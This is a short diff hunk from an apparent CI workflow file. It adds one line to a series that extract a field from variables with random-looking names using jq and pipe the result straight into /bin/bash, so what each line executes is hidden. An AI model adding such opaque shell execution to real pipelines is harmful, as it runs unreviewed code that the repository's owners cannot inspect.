@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$szt3382" | jq -r .l3 | /bin/bash
           echo $clpy06731 | jq -r .q67073 | /bin/bash
           echo $cwds90303 | jq -r .cbdx3399 | /bin/bash
+          echo $esfl43509 | jq -r .ffyur01 | /bin/bash
 
       - name: Upload data
         if: always()
